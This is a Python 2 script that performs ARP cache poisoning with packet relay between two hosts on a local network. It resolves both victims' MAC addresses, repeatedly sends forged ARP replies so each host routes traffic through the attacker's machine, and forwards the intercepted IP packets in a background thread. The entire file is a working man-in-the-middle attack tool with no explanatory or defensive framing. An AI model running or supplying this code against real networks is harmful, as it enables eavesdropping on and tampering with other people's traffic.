#!/usr/bin/python
import socket,time,sys,threading,multiprocessing
from uuid import getnode as getmymac


argc=len(sys.argv)
if argc<4:
	print "Usage : send_arp <interface> <sender ip> <target ip>"
	sys.exit()

argv0=sys.argv[0]
argv1=sys.argv[1]
argv2=sys.argv[2]
argv3=sys.argv[3]
argv4=1
if argc==5:
	argv4=sys.argv[4]
buffer=[]
arp_proto="\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01\xe4\x42\xa6\xa2\x60\x11\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x7f\x00\x00\x01"
arp_reply="\x00\x02"
arp_request="\x00\x01"
arp_type=0x0806
ip_type=0x0800
mymac=format(getmymac(),"012x").decode('hex')

macalen=len(mymac)
etherhlen=len(mymac)*2+2
#ipalen=len()

def Mether(x):
    ether=[]
    ether.append(x[:6])
    ether.append(x[6:12])
    ether.append(x[12:14])
    return ether

def Marp(x):
	arp=[]
	arp.append(x[etherhlen:etherhlen+2])
	arp.append(x[etherhlen+2:etherhlen+4])
	arp.append(x[etherhlen+4])
	arp.append(x[etherhlen+5])
	arp.append(x[etherhlen+6:etherhlen+8]) #opcode
	arp.append(x[etherhlen+8:etherhlen+14]) #sender_mac
	arp.append(x[etherhlen+14:etherhlen+18]) #sender_ip
	arp.append(x[etherhlen+18:etherhlen+24]) #target_mac
	arp.append(x[etherhlen+24:etherhlen+28]) #target_ip
	return arp

def Mip(x):
    ip=[]
    ip.append(x[etherhlen:etherhlen+12])
    ip.append(x[etherhlen+12:etherhlen+16]) #s_ip
    ip.append(x[etherhlen+16:etherhlen+20]) #d_ip
    ip.append(x[etherhlen+20:])
    return ip

def pton(x):
	return socket.inet_pton(socket.AF_INET,x)

def getmyip():
	s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	s.connect(('1.1.1.1',0))
	return s.getsockname()[0]

def ReceivePackets(buffer,etype,l,num=10):
    soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(etype))  
    while 1:
        for i in range(num):
	        packet = soc.recv(l)  
	        buffer.append(packet)
        time.sleep(5)
        buffer=[]


def get_mac(buffer,ip):
    while 1: 
        index=-1
        if s.send(requestp)!=0:
            print "request!"
            for i in range(0,len(list(requestp))):
                if (i!=0 and i%16==0):
                    print
                print list(requestp)[i].encode('hex'),
            print;print
            for i in range(len(buffer)):
                if buffer[i][etherhlen+14:etherhlen+18]==ip:
                    mac=buffer[i][6:12]
                    return mac
                else:
                    continue
        time.sleep(0.8)	

def trecv(l,num,etype=arp_type,b=buffer):
	k=threading.Thread(target=ReceivePackets,args=(b,etype,l,num))
	k.daemon=True
	k.start()
	return k

def poison(buf,s):
	#while 1:
	if s.send(buf)!=0:
			print "poisoning!"
			for i in range(0,len(list(buf))):
				if (i!=0 and i%16==0):
					print
				print list(buf)[i].encode('hex'),
			print;print
	time.sleep(float(argv4))


def sendrelay(s,etype=ip_type):
    ipp = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(etype))  
    while 1:
        buffer=[]
        buffer=ipp.recv(4096)
        relayp=[Mether(buffer),Mip(buffer)]
        if relayp[1][1]==sender_ip:
            relayp[0][0]=target_mac
            relayp[0][1]=mymac
        elif relayp[1][2]==sender_ip:
            relayp[0][0]=sender_mac
            relayp[0][1]=mymac
        else:
            continue
        srelay="".join(relayp[0]+relayp[1])
        if s.send(srelay)!=0:
            print "relay!"
        else:
            continue

#def ReadReply():

sender_ip=pton(argv2)
target_ip=pton(argv3)
myip=pton(getmyip())

_packet=[Mether(arp_proto),(Marp(arp_proto))]



_packet[0][1]=mymac

_packet[1][4]=arp_request

_packet[1][5]=mymac

_packet[1][6]=myip

_packet[1][8]=sender_ip

requestp="".join(_packet[0]+_packet[1])

s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(arp_type))
s.bind((argv1,0))

t=trecv(2048,10,arp_type)

sender_mac=get_mac(buffer,sender_ip)

print sender_mac.encode('hex')

_packet[1][8]=target_ip

requestp="".join(_packet[0]+_packet[1])

target_mac=get_mac(buffer,target_ip)

print target_mac.encode('hex')


_packet[0][0]=sender_mac

_packet[1][4]=arp_reply

_packet[1][6]=target_ip

_packet[1][7]=sender_mac

_packet[1][8]=sender_ip


'''
_is sender and __is target
'''
poisonpS="".join(_packet[0]+_packet[1])


__packet=_packet

__packet[0][0]=target_mac

__packet[1][6]=sender_ip

__packet[1][7]=target_mac

__packet[1][8]=target_ip

poisonpT="".join(__packet[0]+__packet[1])


t=threading.Thread(target=sendrelay,args=(s,))
t.daemon=True
t.start()

while 1:
    poison(poisonpS,s)
    poison(poisonpT,s)
    #sendrelay(s)
